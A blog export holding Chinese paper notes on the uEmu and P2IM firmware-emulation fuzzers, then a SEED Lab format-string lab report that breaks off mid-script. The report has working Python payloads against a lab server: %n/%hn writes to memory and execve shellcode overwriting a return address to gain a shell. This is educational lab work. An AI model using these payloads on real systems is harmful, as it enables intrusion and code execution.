    <title>uEmu论文笔记</title>
    <url>/posts/65903227.html</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>设计了μEmu，使用动态符号执行的方式规避了P2IM需要人工参与基于Access-Pattern对MMIO进行分类的问题，但是存在了路径消失的问题。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当前已有的对固件模拟方法有在硬件上进行模拟，完全脱离硬件模拟等方式，但都有其缺点。例如结合硬件会使fuzzing效率降低，模拟外设P2IM存在寄存器错分类。</p>
<p>uEmu采用动态符号执行技术对固件进行fuzz。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><ul>
<li>提出了固件的模拟执行会同时受到多个外设寄存器的影响。更加重视寄存器在执行时序上的依赖关系。（P2IM相较于此则是规定了固定的MMIO访问规则。实际上并不必须）</li>
<li>采用动态符号执行求解寄存器的依赖关系和满足条件解。</li>
<li>使用深度优先搜索进行动态执行，从而避免了路径爆炸的问题，不过也一定程度上造成了路径消失的问题。</li>
<li>提出了将寄存器约束求解存储到知识库的概念，知识库的树状结构。</li>
</ul>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><p>存在路径消失</p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>分为两个阶段：知识提取阶段和动态分析阶段</p>
<p>使用了S2E平台与Qemu工具，具体结构如下</p>
<img src="/posts/65903227/Figure_2.png" class="" title="Figure_2">

<h3 id="知识提取阶段"><a href="#知识提取阶段" class="headerlink" title="知识提取阶段"></a>知识提取阶段</h3><p>通过挂钩固件对MMIO的写操作，将MMIO寄存器存入知识库（KB）。之后再根据符号化执行来增加MMIO的约束，根据约束求解MMIO特定值并且根据不同MMIO值进入不同分支，在此过程中需要保持固件运行状态为valid（有评价指标），如果MMIO进入分支是invalid，则更换MMIO值，切换到另一分支，在此过程中MMIO分配的值会以分层cache的形式存储在KB中。</p>
<h4 id="根据不同情况，将cache形式分为4类。"><a href="#根据不同情况，将cache形式分为4类。" class="headerlink" title="根据不同情况，将cache形式分为4类。"></a>根据不同情况，将cache形式分为4类。</h4><ul>
<li><p>T0：严格来说并不是一个匹配规则，而是对大部分外设寄存器存储建模，对MMIO进行写操作时，将对应的值存储到KB中，再之后需要读取时返回相应的值即可。如果导致程序进入invalid状态，则更新到T1。</p>
</li>
<li><p>T1：不只记录值，而且记录其寄存器地址和PC（Program Counter）值加以区分。（由于大部分外设寄存器在特定PC处值是固定的），当进入到invalid状态时，更新到T2规则进行匹配</p>
</li>
<li><p>T2：当寄存器地址与PC均相同时，需要T2进行区分，添加了对上下文参数（上三级调用函数PC值+函数参数）的哈希值。如下图<code>UART_WaitOnFlagUntilTimeout</code>函数，两个函数如果都用T1规则匹配，会返回相同值，但是会导致系统异常。因此需要T2规则，因为调用者的PC不同（line3，line7）.</p>
<img src="/posts/65903227/Listing_2.png" class="" title="Listing_2">
</li>
<li><p>T3：当上下文也相同时，将读取操作分为一个列表，按字符单位逐步读取（符号化执行也是使用了按字节分为多个符号）。如下图，若使用T2规则，由于上下文完全相同，导致返回给该函数的四个字节只能是“OOOO”，所以需要按照字节为单位生成四个符号。读取时逐步读取。</p>
<img src="/posts/65903227/image-20231205111046993.png" class="" title="image-20231205111046993"></li>
</ul>
<h4 id="invalid执行状态判断标准"><a href="#invalid执行状态判断标准" class="headerlink" title="invalid执行状态判断标准"></a>invalid执行状态判断标准</h4><ul>
<li>死循环：如果寄存器包含符号变量，uEmu将其解为具体值并作比较，如果发现重复则证明是死循环。（检查范围为30个代码基本块，main函数）</li>
<li>长循环：固件在等待某种特定操作，导致超时。如果发现循环次数超过2000即认为为长循环</li>
<li><strong>非法读写</strong>：非法访问未装载内存，装载的内存包括（ROM，RAM，系统区域和外设区域）</li>
<li>用户定义：例如断言失败操作。</li>
</ul>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
        <tag>论文复现</tag>
      </tags>
  </entry>
  <entry>
    <title>P2IM论文笔记</title>
    <url>/posts/1c19887b.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>背景：</strong>模拟以MCU为处理器的固件设备并没有完全的模拟外设，导致fuzzing时外设需要实际物理设备，速度偏慢，且没有达到完全模拟。</p>
<p>主要实现了一个可以模拟在MCU下运行的固件的模拟器P2IM。通过自动化外设接口的建模来进行自动化，可扩展的模拟。</p>
<p>特点：对mcu架构下的寄存器进行分类识别，在qemu模拟时同时模拟这些寄存器值的操作，从而模拟出了firmware外设的一系列操作。保证了firmware在qemu上的稳定运行的同时加入了外设的模拟。</p>
<h2 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h2><p>当时对固件的模拟需要软硬件结合，导致fuzz的效率很慢，因此提出了一种模拟器对固件完全模拟的思路，通过实现对固件外设寄存器的分类并模拟以达到完全模拟的目的。</p>
<h2 id="主要贡献"><a href="#主要贡献" class="headerlink" title="主要贡献"></a>主要贡献</h2><p>实现了对无硬件模拟</p>
<p>提出了P2IE（外设接口等效属性）：为了定义怎样的仿真是好的仿真</p>
<p>提出了MMIO寄存器四种模型：对四种模型的行为进行了定义</p>
<p>探索性执行技术</p>
<h2 id="尚存不足"><a href="#尚存不足" class="headerlink" title="尚存不足"></a>尚存不足</h2><ul>
<li><p>寄存器分类可能存在错误（eg: 某些SR会错分类为DR，导致fuzz时将其作为输入，效率下降。）</p>
</li>
<li><p>代码覆盖率不够高</p>
<ul>
<li>存在僵尸代码：写了但是没有使用上的代码</li>
<li>模糊器太基础：只用了最简单的AFL</li>
<li>假挂起情况：出现了两次假挂起的情况，一次是由于DR被错误分类为了CR；另一次是出现了DMA操作，P2IM不予处理</li>
<li>输入保持：作者发现不仅是输入值，输入持续的时间也会影响固件逻辑的执行</li>
</ul>
</li>
</ul>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="Processor-Peripheral-Interface-Equivalence："><a href="#Processor-Peripheral-Interface-Equivalence：" class="headerlink" title="Processor-Peripheral Interface Equivalence："></a><strong>Processor-Peripheral Interface Equivalence</strong>：</h3><p>1）模拟器模拟了外设接口，而不是外设本身；2）模拟接口要与固件提供的外设行为相同，以便顺利运行</p>
<p><strong>该文章模拟的寄存器为</strong>①②类，③由于不同设备差异较大不涉及。</p>
<img src="/posts/1c19887b/figure_2.png" class="" title="figure_2">

<h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a><strong>实现步骤</strong></h3><img src="/posts/1c19887b/Figure_3.png" class="" title="Figure_3">

<ol>
<li>根据专家对MCU的架构以及寄存器操作构建抽象模型，主要是总结了寄存器的类别和中断的类型。</li>
<li>模型的实例化，将抽象模型具体化为可用于特定固件模拟的模型。主要是根据固件对寄存器的操作类型以及后续的访问方式将寄存器进行分类以及设置中断。</li>
</ol>
<h4 id="抽象模型构建"><a href="#抽象模型构建" class="headerlink" title="抽象模型构建"></a>抽象模型构建</h4><h5 id="寄存器种类"><a href="#寄存器种类" class="headerlink" title="寄存器种类"></a>寄存器种类</h5><p>外设寄存器会被映射到固定内存区域（0x40000000-0x5fffffff）</p>
<p><strong>Control Registers（CR）</strong>：</p>
<ul>
<li>Access Pattern：RMW，大部分为先读，再修改，再写回。因为可能会有其他控制参数。所以需要先保存数据。小部分会是直接写入，模型会分类为DR（Data Registers），但是此类寄存器之后不会在被读取，因此对固件运行没有影响。</li>
<li>Access Handling：模拟器将分类好的CR作为永久变量，不再改变。</li>
</ul>
<p><strong>Status Registers（SR）：</strong></p>
<ul>
<li>Access Pattern：若对寄存器访问为非条件读，且读取到的值作为了判断条件。则可以作为SR。部分情况下，可能会是直接写入，则会导致SR错判为DR，不过可以在后续再次访问时进行修改（polls）</li>
<li>Access handling：SR经常变化，P2IM使用探索式执行的方式来自动推断SR值（遍历取最优），对于SR的写操作则显得没有必要，因此直接忽略SR写入。</li>
</ul>
<p><strong>Data Registers（DR）</strong>：</p>
<ul>
<li>Access Pattern：若寄存器是被SR读后访问的，或者是直接写入的，那么将其作为DR</li>
<li>Access Handling：理想的Fuzzing接口。</li>
</ul>
<p><strong>Control-Status Register（C&amp;SR）</strong>：</p>
<p>有些寄存器既可以做CR又可以做SR，不过由于CR是在外设配置阶段进行修改，SR为在外设运行阶段进行修改，所以只需在不同时刻将其按不同分类识别即可。</p>
<h5 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h5><p>直接使用基于代码块的中断方式（简单，易于复现）每执行1000个基本块后进行一次中断。</p>
<h5 id="并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作"><a href="#并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作" class="headerlink" title="并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作"></a>并没有对不可行输入进行判别：1）可以作为Fuzzer的改进；2）如果攻击者已经攻陷设备，则也有可能进行这些操作</h5><h4 id="自动构建具体模型"><a href="#自动构建具体模型" class="headerlink" title="自动构建具体模型"></a>自动构建具体模型</h4><img src="/posts/1c19887b/Figure_4.png" class="" title="Figure_4">

<p>实例化过程与fuzzing过程同时进行，相互补充。首先进行fuzzer输入，如果模型由于未实例化的部分而停止，那么就停止fuzzing，根据已有的fuzzing输入信息进行实例化，如果实例化过程结束则继续进行fuzz。</p>
<p><strong>模型实例化主要内容：</strong></p>
<ul>
<li>识别内存映射的寄存器类型，内存位置</li>
<li>每个寄存器的访问处理方式</li>
<li>启用的中断类型</li>
</ul>
<p>注：同一外设的内存映射寄存器通常在内存区域地址是连续的，可以根据此特点将寄存器归为同一个外设，方便后续的优化。</p>
<h5 id="Explorative-Execution"><a href="#Explorative-Execution" class="headerlink" title="Explorative Execution"></a>Explorative Execution</h5><p>前面提到了SR由于频繁变化的特性，导致每次需要调用其值时，都无法确定其正确值，因此采用了探索式执行的方式来确定SR的最优解</p>
<p>通过遍历SR的可能取值（32位只考虑同时只存在一个bit为1的情况），共32种情况，只需新建32个线程同时运行，查看哪个线程运行效果最好来确定结果（通过查看在跳出函数时的情况来判断）</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>IS</tag>
        <tag>IoT</tag>
        <tag>Fuzz</tag>
        <tag>固件模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>【SeedLab】格式化字符串实验报告</title>
    <url>/posts/5a0832a9.html</url>
    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
<h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>关闭ASLR</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">kernel.randomize_va_space = 0</span><br></pre></td></tr></table></figure>

<h3 id="2-2-The-Vulnerable-Program"><a href="#2-2-The-Vulnerable-Program" class="headerlink" title="2.2 The Vulnerable Program"></a>2.2 The Vulnerable Program</h3><p>漏洞程序如下</p>
<p><code>format.c</code>：<code>myprintf</code>存在漏洞<code>printf(msg)</code>;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Compilation</strong>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cd server-code</span><br><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../fmt-containers</span><br><span class="line">cp format-* ../fmt-containers</span><br></pre></td></tr></table></figure>

<p>可以看到编译中gcc会警告存在格式化字符串漏洞</p>
<h3 id="2-3-Container-Setup-and-Commands"><a href="#2-3-Container-Setup-and-Commands" class="headerlink" title="2.3 Container Setup and Commands"></a>2.3 Container Setup and Commands</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dcbuild</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure>

<h2 id="3-Task-1-Crashing-the-Program"><a href="#3-Task-1-Crashing-the-Program" class="headerlink" title="3 Task 1: Crashing the Program"></a>3 Task 1: Crashing the Program</h2><p>首先尝试向10.9.0.5发送hello消息</p>
<img src="/posts/5a0832a9/image-20231211150919446.png" class="" title="image-20231211150919446">

<p>server端结果</p>
<img src="/posts/5a0832a9/image-20231211150812716.png" class="" title="image-20231211150812716">

<p>服务器最多接受1500字节的数据，在此任务中，需要构造payload让程序崩溃（服务器不会崩溃，因为format程序是server的子进程）</p>
<p>构造payload：<code>%s</code>，发现服务器端没有输出，程序成功crash</p>
<img src="/posts/5a0832a9/image-20231211151346427.png" class="" title="image-20231211151346427">

<img src="/posts/5a0832a9/image-20231211151405655.png" class="" title="image-20231211151405655">

<h2 id="4-Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#4-Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="4 Task 2: Printing Out the Server Program’s Memory"></a>4 Task 2: Printing Out the Server Program’s Memory</h2><p>继续使用10.9.0.5，令服务器打印出内存中数据</p>
<h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h3><p>打印栈上数据，需要知道需要多少个<code>%.8x</code>占位符，才能使服务器程序打印出输入的前四个字节。</p>
<p>构造python脚本，设定前四个字节为<code>0xffffffff</code>，构造100个<code>%.8x.</code>，令服务器端打印100个地址，查看前四个字节的位置。</p>
<img src="/posts/5a0832a9/image-20231211152629169.png" class="" title="image-20231211152629169">

<p>可以看到，<code>0xffffffff</code>位于第64个<code>%.8x.</code>处。</p>
<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>堆上存储着一个秘密值，可以通过服务器端输出查找到，目标为打印出secret秘密值</p>
<p>由服务器端输出可以知道secret的地址为<code>0x080b4008</code>，因此将buffer的前四个字节设置为secret的地址，通过<code>%s</code>令服务器输出该地址的值。</p>
<p>构造python脚本如下:</p>
<img src="/posts/5a0832a9/image-20231211153657826.png" class="" title="image-20231211153657826">

<p>结果如上图，成功输出<code>A secret message</code>字符串</p>
<h2 id="5-Task-3-Modifying-the-Server-Program’s-Memory"><a href="#5-Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="5 Task 3: Modifying the Server Program’s Memory"></a>5 Task 3: Modifying the Server Program’s Memory</h2><p>继续使用10.9.0.5，目标为修改0x11223344地址的值。</p>
<h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>更改值即可，由服务器端输出可知<code>target</code>地址为<code>0x080e5068</code>，可以通过<code>%n</code>修改地址的值，构造payload。</p>
<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">63</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>

<p>输出如下图，可见<code>target</code>成功被修改为了前面输出字符的个数(4+4+63*9)&#x3D;575&#x3D;0x23f</p>
<img src="/posts/5a0832a9/image-20231211154137419.png" class="" title="image-20231211154137419">

<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><p>0x5000-0x23f &#x3D;  19905 因此需要增加19905个字符。</p>
<p>构造<code>payload</code>如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.19914x&quot;</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>

<p>成功修改值为0x5000</p>
<img src="/posts/5a0832a9/image-20231211160234002.png" class="" title="image-20231211160234002">

<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>值比较大，因此如果使用<code>%n</code>会导致输出时间过长，甚至可能卡死，因此需要使用<code>%hn</code>或<code>%hhn</code>一次只修改两个或一个字节。</p>
<p>如果使用<code>%hn</code>构造payload，一次只修改两字节，则需要先修改值较小的地址，然后才能修改值较高的地址。</p>
<p>构造前八个字节分别对应<code>0xAABB</code>和<code>0xCCDD</code>的地址，并且构造payload对两个地址的值分别进行修改：<code>0xaabb - 0x23f + 9 - 4 = 43137</code>， <code>0xccdd - 0xaabb = 8738</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x080e5068</span> <span class="comment"># target地址（小端法，读两个字节就是0x5068）</span></span><br><span class="line">number_1 = number + <span class="number">2</span>   <span class="comment"># target前2个字节地址</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number_1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.43137x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.8738x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p>成功修改成目标值</p>
<img src="/posts/5a0832a9/image-20231211164056253.png" class="" title="image-20231211164056253">

<h2 id="6-Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#6-Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="6 Task 4: Inject Malicious Code into the Server Program"></a>6 Task 4: Inject Malicious Code into the Server Program</h2><h3 id="6-1-Understanding-the-Stack-Layout"><a href="#6-1-Understanding-the-Stack-Layout" class="headerlink" title="6.1 Understanding the Stack Layout"></a>6.1 Understanding the Stack Layout</h3><img src="/posts/5a0832a9/image-20231211164407343.png" class="" title="image-20231211164407343">

<p><strong>Question 1: What are the memory addresses at the locations marked by 2 and 3?</strong></p>
<p>  ②是函数<code>myprintf</code>的返回地址，地址应为<code>frame pointer+4 = 0xffffcfac</code>③是<code>buf</code>的起始地址，可以从服务器输出直接获得：<code>0xffffd080</code></p>
<p><strong>Question 2: How many %x format specifiers do we need to move the format string argument pointerto 3? Remember, the argument pointer starts from the location above 1.</strong></p>
<p>由上文可知，buf的前四字节需要64个%x才可以达到。</p>
<h3 id="6-3-Your-Task"><a href="#6-3-Your-Task" class="headerlink" title="6.3 Your Task"></a>6.3 Your Task</h3><p>获取server的shell。</p>
<p>需要修改函数<code>myprintf</code>的返回地址为<code>shellcode</code>地址，将<code>shellcode</code>放在buf末尾，然后使用上文的方法将shellcode地址写入返回地址即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">shellcode_addr = <span class="number">0xffffd5d4</span>  <span class="comment"># 0xffffd080 + start</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line">number  = <span class="number">0xffffcfa8</span> + <span class="number">4</span></span><br><span class="line">number_1 = number + <span class="number">2</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (number_1).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span 